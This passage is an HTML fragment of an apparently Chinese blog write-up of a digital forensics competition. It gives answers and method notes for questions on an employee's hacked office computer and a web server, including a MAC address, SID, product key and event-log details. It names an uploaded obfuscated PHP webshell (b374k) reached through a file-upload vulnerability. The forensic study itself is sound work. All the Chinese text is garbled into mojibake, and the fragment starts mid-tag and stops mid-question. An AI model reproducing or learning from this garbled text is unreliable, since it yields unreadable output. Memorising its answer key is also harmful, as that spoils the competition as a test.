id="å·¥åœ°èŒå‘˜Bçš„åŠå…¬å®¤è®¡ç®—æœº"><a href="#å·¥åœ°èŒå‘˜Bçš„åŠå…¬å®¤è®¡ç®—æœº" class="headerlink" title="å·¥åœ°èŒå‘˜Bçš„åŠå…¬å®¤è®¡ç®—æœº"></a>å·¥åœ°èŒå‘˜Bçš„åŠå…¬å®¤è®¡ç®—æœº</h2><h3 id="9-å¤šé€‰é¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºåœ¨ä»€ä¹ˆæ—¥æœŸå’Œæ—¶é—´è¢«é»‘å®¢æ§åˆ¶ï¼Ÿ-2åˆ†"><a href="#9-å¤šé€‰é¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºåœ¨ä»€ä¹ˆæ—¥æœŸå’Œæ—¶é—´è¢«é»‘å®¢æ§åˆ¶ï¼Ÿ-2åˆ†" class="headerlink" title="9 . [å¤šé€‰é¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºåœ¨ä»€ä¹ˆæ—¥æœŸå’Œæ—¶é—´è¢«é»‘å®¢æ§åˆ¶ï¼Ÿ (2åˆ†)"></a>9 . [å¤šé€‰é¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºåœ¨ä»€ä¹ˆæ—¥æœŸå’Œæ—¶é—´è¢«é»‘å®¢æ§åˆ¶ï¼Ÿ (2åˆ†)</h3><p>A. 2021-10-19</p><p>B. 2021-09-16</p><p>C. 11:16:41 (UTC +8:00)</p><p>D. 05:55:50 (UTC +8:00)</p><p>E. 18:40:06 (UTC +8:00)<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-104347322.png" class=""><br>æ„Ÿè§‰é¢˜ç›®æ€ªæ€ªçš„</p><h3 id="10-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºçš„MAC-Addressæ˜¯ä»€ä¹ˆ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆ-1åˆ†"><a href="#10-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºçš„MAC-Addressæ˜¯ä»€ä¹ˆ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆ-1åˆ†" class="headerlink" title="10. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºçš„MAC Addressæ˜¯ä»€ä¹ˆ? (è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆ) (1åˆ†)"></a>10. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºçš„MAC Addressæ˜¯ä»€ä¹ˆ? (è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆ) (1åˆ†)</h3><p>æŸ¥çœ‹ç½‘ç»œç½‘å¡çš„Macåœ°å€<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-105322293.png" class=""><br>00-0C-29-E2-53-2D</p><h3 id="11-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºç”¨æˆ·FaFaçš„-Profile-ID-æ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†"><a href="#11-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºç”¨æˆ·FaFaçš„-Profile-ID-æ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†" class="headerlink" title="11. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºç”¨æˆ·FaFaçš„ Profile ID æ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)"></a>11. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºç”¨æˆ·FaFaçš„ Profile ID æ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)</h3><p>profile IDå…¶å®å°±æ˜¯SID<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-110025109.png" class="">  </p><h3 id="12-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„åŠå…¬å®¤è®¡ç®—æœºçš„-Windows-CD-Key-æ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†"><a href="#12-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„åŠå…¬å®¤è®¡ç®—æœºçš„-Windows-CD-Key-æ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†" class="headerlink" title="12. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„åŠå…¬å®¤è®¡ç®—æœºçš„ Windows CD Key æ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)"></a>12. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„åŠå…¬å®¤è®¡ç®—æœºçš„ Windows CD Key æ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥å¤§å†™è‹±æ–‡åŠæ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)</h3><p>CD keyå…¶å®å°±æ˜¯äº§å“å¯†é’¥<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-110435701.png" class="">  </p><h3 id="13-å•é€‰é¢˜-æ£€æŸ¥è¿‡å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºç™»å½•æ¡£å-Window-Registry-ï¼Œè®¡ç®—æœºæ„ŸæŸ“äº†ä»€ä¹ˆæ¶æ„è½¯ä»¶ï¼Ÿ-2åˆ†"><a href="#13-å•é€‰é¢˜-æ£€æŸ¥è¿‡å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºç™»å½•æ¡£å-Window-Registry-ï¼Œè®¡ç®—æœºæ„ŸæŸ“äº†ä»€ä¹ˆæ¶æ„è½¯ä»¶ï¼Ÿ-2åˆ†" class="headerlink" title="13. [å•é€‰é¢˜] æ£€æŸ¥è¿‡å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºç™»å½•æ¡£å(Window Registry)ï¼Œè®¡ç®—æœºæ„ŸæŸ“äº†ä»€ä¹ˆæ¶æ„è½¯ä»¶ï¼Ÿ (2åˆ†)"></a>13. [å•é€‰é¢˜] æ£€æŸ¥è¿‡å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºç™»å½•æ¡£å(Window Registry)ï¼Œè®¡ç®—æœºæ„ŸæŸ“äº†ä»€ä¹ˆæ¶æ„è½¯ä»¶ï¼Ÿ (2åˆ†)</h3><p>A. Adware</p><p>B. Worms</p><p>C. Rootkits</p><p>D. æ²¡æœ‰æ„ŸæŸ“ä»»ä½•æ¶æ„è½¯ä»¶</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-114402900.png" class="">  <p>D</p><h3 id="14-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Bçš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡â€-120778782-58759559-jpgâ€ï¼Œæœ‰å¯èƒ½æ˜¯ä»ä¸‹åˆ—å“ªä¸ªçš„é€”å¾„è½½å…¥è®¡ç®—æœºï¼Ÿ-1åˆ†"><a href="#14-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Bçš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡â€-120778782-58759559-jpgâ€ï¼Œæœ‰å¯èƒ½æ˜¯ä»ä¸‹åˆ—å“ªä¸ªçš„é€”å¾„è½½å…¥è®¡ç®—æœºï¼Ÿ-1åˆ†" class="headerlink" title="14. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Bçš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡â€_120778782_58759559.jpgâ€ï¼Œæœ‰å¯èƒ½æ˜¯ä»ä¸‹åˆ—å“ªä¸ªçš„é€”å¾„è½½å…¥è®¡ç®—æœºï¼Ÿ (1åˆ†)"></a>14. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Bçš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡â€_120778782_58759559.jpgâ€ï¼Œæœ‰å¯èƒ½æ˜¯ä»ä¸‹åˆ—å“ªä¸ªçš„é€”å¾„è½½å…¥è®¡ç®—æœºï¼Ÿ (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-115034363.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-113025500.png" class="">  <p>C<br>A. ç”µé‚®ä¸‹è½½é™„ä»¶</p><p>B. USBç›˜</p><p>C. ç½‘ä¸Šä¸‹è½½</p><p>D. è“èŠ½ä¼ å…¥</p><p>E. Direct-link</p><h3 id="15-å¤šé€‰é¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡ä¸­ï¼Œäººç‰©ä¸­è¡£ç€æœ‰ä»€ä¹ˆé¢œè‰²ï¼Ÿ-2åˆ†"><a href="#15-å¤šé€‰é¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡ä¸­ï¼Œäººç‰©ä¸­è¡£ç€æœ‰ä»€ä¹ˆé¢œè‰²ï¼Ÿ-2åˆ†" class="headerlink" title="15. [å¤šé€‰é¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡ä¸­ï¼Œäººç‰©ä¸­è¡£ç€æœ‰ä»€ä¹ˆé¢œè‰²ï¼Ÿ (2åˆ†)"></a>15. [å¤šé€‰é¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºä¸­è¢«åŠ å¯†ç¡¬ç›˜å†…çš„å›¾ç‰‡ä¸­ï¼Œäººç‰©ä¸­è¡£ç€æœ‰ä»€ä¹ˆé¢œè‰²ï¼Ÿ (2åˆ†)</h3><p>A. é»„è‰²</p><p>B. çº¢è‰²</p><p>C. ç´«è‰²</p><p>D. è“è‰²</p><p>E. ç»¿è‰²<br>BE</p><h3 id="16-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ªç£ç›˜åˆ†åŒºï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ-1åˆ†"><a href="#16-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ªç£ç›˜åˆ†åŒºï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ-1åˆ†" class="headerlink" title="16. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ªç£ç›˜åˆ†åŒºï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ) (1åˆ†)"></a>16. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ªç£ç›˜åˆ†åŒºï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-115152455.png" class="">  <p>5</p><h3 id="17-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºç¡¬ç›˜åˆ†å‰²è¡¨æ˜¯ä»€ä¹ˆï¼Ÿ-ç­”æ¡ˆè¯·ä»¥é¦–å­—æ¯å¤§å†™ä½œç­”-2åˆ†"><a href="#17-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºç¡¬ç›˜åˆ†å‰²è¡¨æ˜¯ä»€ä¹ˆï¼Ÿ-ç­”æ¡ˆè¯·ä»¥é¦–å­—æ¯å¤§å†™ä½œç­”-2åˆ†" class="headerlink" title="17. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºç¡¬ç›˜åˆ†å‰²è¡¨æ˜¯ä»€ä¹ˆï¼Ÿ(ç­”æ¡ˆè¯·ä»¥é¦–å­—æ¯å¤§å†™ä½œç­”) (2åˆ†)"></a>17. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºç¡¬ç›˜åˆ†å‰²è¡¨æ˜¯ä»€ä¹ˆï¼Ÿ(ç­”æ¡ˆè¯·ä»¥é¦–å­—æ¯å¤§å†™ä½œç­”) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-123102374.png" class="">  <p>åœ¨ç£ç›˜ç®¡ç†æŸ¥çœ‹ç£ç›˜0çš„å±æ€§å¯ä»¥å¾—åˆ° GUID</p><h3 id="18-å¡«ç©ºé¢˜-åœ¨-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºEvent-Logä¸­æœ€åç™»å…¥æ—¶services-exeçš„Process-IDæ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥-3åˆ†"><a href="#18-å¡«ç©ºé¢˜-åœ¨-å·¥åœ°èŒå‘˜-B-çš„è®¡ç®—æœºEvent-Logä¸­æœ€åç™»å…¥æ—¶services-exeçš„Process-IDæ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥-3åˆ†" class="headerlink" title="18. [å¡«ç©ºé¢˜] åœ¨ å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºEvent Logä¸­æœ€åç™»å…¥æ—¶services.exeçš„Process IDæ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥) (3åˆ†)"></a>18. [å¡«ç©ºé¢˜] åœ¨ å·¥åœ°èŒå‘˜ B çš„è®¡ç®—æœºEvent Logä¸­æœ€åç™»å…¥æ—¶services.exeçš„Process IDæ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥) (3åˆ†)</h3><p>services.exeåœ¨ç³»ç»Ÿå¼€æœºå’Œå…³æœºæ—¶è§¦å‘ï¼Œæ‰€æœ‰å…¶å¸®éšè¿™ç”¨æˆ·çš„ç™»é™†ï¼Œæˆ‘ä»¬æŸ¥çœ‹ç™»é™†æ—¥å¿—<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143439466.png" class=""><br>æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨4624å·äº‹ä»¶é‡Œå¯ä»¥æ‰¾åˆ°process id<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143321629.png" class="">  </p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143306025.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-143552025.png" class="">  <p>636</p><h1 id="å…ƒæåŸæ–™"><a href="#å…ƒæåŸæ–™" class="headerlink" title="å…ƒæåŸæ–™"></a>å…ƒæåŸæ–™</h1><h2 id="ç½‘é¡µæœåŠ¡å™¨"><a href="#ç½‘é¡µæœåŠ¡å™¨" class="headerlink" title="ç½‘é¡µæœåŠ¡å™¨"></a>ç½‘é¡µæœåŠ¡å™¨</h2><h3 id="19-å¡«ç©ºé¢˜-ç”šä¹ˆIPæ›¾ç»ä¸Šä¼ æ¡£æ¡ˆåˆ°ç½‘é¡µæœåŠ¡å™¨-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ-2åˆ†"><a href="#19-å¡«ç©ºé¢˜-ç”šä¹ˆIPæ›¾ç»ä¸Šä¼ æ¡£æ¡ˆåˆ°ç½‘é¡µæœåŠ¡å™¨-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ-2åˆ†" class="headerlink" title="19. [å¡«ç©ºé¢˜] ç”šä¹ˆIPæ›¾ç»ä¸Šä¼ æ¡£æ¡ˆåˆ°ç½‘é¡µæœåŠ¡å™¨? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€.â€œ) (2åˆ†)"></a>19. [å¡«ç©ºé¢˜] ç”šä¹ˆIPæ›¾ç»ä¸Šä¼ æ¡£æ¡ˆåˆ°ç½‘é¡µæœåŠ¡å™¨? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€.â€œ) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-153128786.png" class="">  <p>xamppæ˜¯ä¸€ä¸ªé›†æˆçš„webç¯å¢ƒä¸»è¦æ˜¯æ–¹ä¾¿å®‰è£…apacheè€Œç”Ÿçš„ã€‚<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-154632959.png" class=""><br>æ‰“å¼€æœåŠ¡å™¨ç„¶åæ‰“å¼€æµè§ˆå™¨ä¼šåœ¨å†å²è®°å½•å‘ç°ç½‘ç«™<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-154858261.png" class=""><br>ç®€å•æŠ“ä¸ªåŒ…ï¼Œå¯ä»¥çŸ¥é“å…¶ä¸Šä¼ è·¯ç”±<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-155402410.png" class=""><br>çœ‹ä¸€ä¸‹apacheæ—¥å¿—å³å¯çŸ¥é“ip<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-155928108.png" class=""><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¿çœŸå‡ºæ¥çš„ipå…¨æ˜¯192.168.20.1<br>ipä¸º203.145.94.120 </p><h3 id="20-å¤šé€‰é¢˜-æ‰¿ä¸Šé¢˜ï¼Œä»¥ä¸‹å“ªè¯•æ¡£æ¡ˆæ›¾è¢«ä¸Šä¼ åˆ°ç½‘é¡µæœåŠ¡å™¨-3åˆ†"><a href="#20-å¤šé€‰é¢˜-æ‰¿ä¸Šé¢˜ï¼Œä»¥ä¸‹å“ªè¯•æ¡£æ¡ˆæ›¾è¢«ä¸Šä¼ åˆ°ç½‘é¡µæœåŠ¡å™¨-3åˆ†" class="headerlink" title="20. [å¤šé€‰é¢˜] æ‰¿ä¸Šé¢˜ï¼Œä»¥ä¸‹å“ªè¯•æ¡£æ¡ˆæ›¾è¢«ä¸Šä¼ åˆ°ç½‘é¡µæœåŠ¡å™¨? (3åˆ†)"></a>20. [å¤šé€‰é¢˜] æ‰¿ä¸Šé¢˜ï¼Œä»¥ä¸‹å“ªè¯•æ¡£æ¡ˆæ›¾è¢«ä¸Šä¼ åˆ°ç½‘é¡µæœåŠ¡å™¨? (3åˆ†)</h3><p>A. kjk2.jpg</p><p>B. kjk2.php</p><p>C. b6778k-9.0.php</p><p>D. b374k-2.5.php</p><p>E. d374k-2.5.php</p><p>å› ä¸ºæ–‡ä»¶ä¸Šä¼ çš„æ–‡ä»¶ååœ¨è¡¨å•é‡Œï¼Œæˆ‘ä»¬çš„logæ˜¯çœ‹ä¸åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨æ£€ææ–‡ä»¶å¤¹é‡Œæœç´¢ï¼Œæœçš„åˆ°çš„å°±æ˜¯è¢«ä¸Šä¼ çš„Aï¼ŒBï¼ŒCï¼ŒD æˆ‘çœ‹ç½‘ä¸Šè¯´cä¸æ˜¯æˆ‘ä¸ªäººå­˜ç–‘ï¼Œapacheçš„æ—¥å¿—è®°å½•çš„æ˜¯è®¿é—®æ—¥å¿—Cä¸åœ¨æ—¥å¿—é‡Œä¸èƒ½è¯´æ˜å…¶ä¸æ˜¯è¢«ä¸Šä¼ çš„<br>è€Œä¸”<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-161907312.png" class=""><br>å¾ˆéš¾æŠŠä»–ç†è§£æˆéä¸Šä¼ çš„ã€‚å¦‚æœæœ‰å¤§ä½¬çŸ¥é“æ­£è§£å¯ä»¥è¯„è®ºçº æ­£</p><h3 id="21-å•é€‰é¢˜-å…¥ä¾µè€…å¯èƒ½ä½¿ç”¨ç”šä¹ˆæ¼æ´è¿›è¡Œå…¥ä¾µç½‘é¡µæœåŠ¡å™¨-1åˆ†"><a href="#21-å•é€‰é¢˜-å…¥ä¾µè€…å¯èƒ½ä½¿ç”¨ç”šä¹ˆæ¼æ´è¿›è¡Œå…¥ä¾µç½‘é¡µæœåŠ¡å™¨-1åˆ†" class="headerlink" title="21. [å•é€‰é¢˜] å…¥ä¾µè€…å¯èƒ½ä½¿ç”¨ç”šä¹ˆæ¼æ´è¿›è¡Œå…¥ä¾µç½‘é¡µæœåŠ¡å™¨? (1åˆ†)"></a>21. [å•é€‰é¢˜] å…¥ä¾µè€…å¯èƒ½ä½¿ç”¨ç”šä¹ˆæ¼æ´è¿›è¡Œå…¥ä¾µç½‘é¡µæœåŠ¡å™¨? (1åˆ†)</h3><p>A. æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><p>B. SQL æ³¨å…¥</p><p>C. è·¨ç«™è„šæœ¬æ”»å‡»</p><p>D. æ ¼å¼åŒ–å­—ç¬¦ä¸²å¼±ç‚¹</p><p>çœ‹ä¸€çœ¼ä¸Šä¼ çš„æ–‡ä»¶<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-161533336.png" class="">  </p><p>A<br>ä¸€çœ‹å°±çŸ¥é“æ˜¯ç»è¿‡æ··æ·†çš„æœ¨é©¬</p><h3 id="22-å¤šé€‰é¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨æ‰¾åˆ°çš„æ‰€æœ‰æ–‡ä»¶æ¡£-doc-åŠ-docx-ä¸­ï¼Œæœ‰ä»¥ä¸‹å“ªäº›æ–‡ä»¶åˆ¶ä½œäºº-Author-2åˆ†"><a href="#22-å¤šé€‰é¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨æ‰¾åˆ°çš„æ‰€æœ‰æ–‡ä»¶æ¡£-doc-åŠ-docx-ä¸­ï¼Œæœ‰ä»¥ä¸‹å“ªäº›æ–‡ä»¶åˆ¶ä½œäºº-Author-2åˆ†" class="headerlink" title="22. [å¤šé€‰é¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨æ‰¾åˆ°çš„æ‰€æœ‰æ–‡ä»¶æ¡£(doc åŠ docx)ä¸­ï¼Œæœ‰ä»¥ä¸‹å“ªäº›æ–‡ä»¶åˆ¶ä½œäºº(Author)? (2åˆ†)"></a>22. [å¤šé€‰é¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨æ‰¾åˆ°çš„æ‰€æœ‰æ–‡ä»¶æ¡£(doc åŠ docx)ä¸­ï¼Œæœ‰ä»¥ä¸‹å“ªäº›æ–‡ä»¶åˆ¶ä½œäºº(Author)? (2åˆ†)</h3><p>A. Kevin L. Brown</p><p>B. Peter R. Lee</p><p>C. Mary</p><p>D. May</p><p>E. Colin<br>å¯¼å‡ºæ‰€æœ‰çš„wordæ–‡æ¡£ï¼Œå› ä¸ºé¢˜ç›®æ²¡è®©æˆ‘ä»¬çœ‹dotxçš„æ–‡æ¡£æ‰€ä»¥æˆ‘ä»¬çœ‹docçš„æ–‡ä»¶å³å¯<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-165942068.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-170040257.png" class="">  </p><p>é€‰Aã€C</p><h3 id="23-å¤šé€‰é¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå“ªä¸ªæ˜¯å¯ç–‘æ¡£æ¡ˆ-å®ƒå¦‚ä½•å–å¾—è®¡ç®—æœºæ§åˆ¶æƒ-3åˆ†"><a href="#23-å¤šé€‰é¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå“ªä¸ªæ˜¯å¯ç–‘æ¡£æ¡ˆ-å®ƒå¦‚ä½•å–å¾—è®¡ç®—æœºæ§åˆ¶æƒ-3åˆ†" class="headerlink" title="23. [å¤šé€‰é¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå“ªä¸ªæ˜¯å¯ç–‘æ¡£æ¡ˆ?å®ƒå¦‚ä½•å–å¾—è®¡ç®—æœºæ§åˆ¶æƒ? (3åˆ†)"></a>23. [å¤šé€‰é¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå“ªä¸ªæ˜¯å¯ç–‘æ¡£æ¡ˆ?å®ƒå¦‚ä½•å–å¾—è®¡ç®—æœºæ§åˆ¶æƒ? (3åˆ†)</h3><p>A. å¯ç–‘æ¡£æ¡ˆ: b6778k-9.0.php</p><p>B. å¯ç–‘æ¡£æ¡ˆ: b374k-2.5.php</p><p>C. å¯ç–‘æ¡£æ¡ˆ: upload.php</p><p>D. é€è¿‡æµè§ˆå™¨è¿œç¨‹ç®¡ç†å–å¾—è®¡ç®—æœºæ§åˆ¶æƒ</p><p>E.é€è¿‡PuTTY(è¿œç¨‹ç™»å½•å·¥å…·) å–å¾—è®¡ç®—æœºæ§åˆ¶æƒ</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-170327487.png" class="">  <p>é»‘å®¢ä¸Šä¼ æœ¨é©¬æ–‡ä»¶b374k-2.5.phpï¼Œæ¥rceï¼Œé€‰Bï¼ŒD</p><h3 id="24-å¡«ç©ºé¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œè¿è¡Œå¯ç–‘æ¡£æ¡ˆéœ€è¦å¯†ç ï¼Œå…¶å¯†ç çš„å“ˆå¸Œå€¼-Hash-Value-æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3åˆ†"><a href="#24-å¡«ç©ºé¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œè¿è¡Œå¯ç–‘æ¡£æ¡ˆéœ€è¦å¯†ç ï¼Œå…¶å¯†ç çš„å“ˆå¸Œå€¼-Hash-Value-æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3åˆ†" class="headerlink" title="24. [å¡«ç©ºé¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œè¿è¡Œå¯ç–‘æ¡£æ¡ˆéœ€è¦å¯†ç ï¼Œå…¶å¯†ç çš„å“ˆå¸Œå€¼(Hash Value)æ˜¯ç”šä¹ˆ? 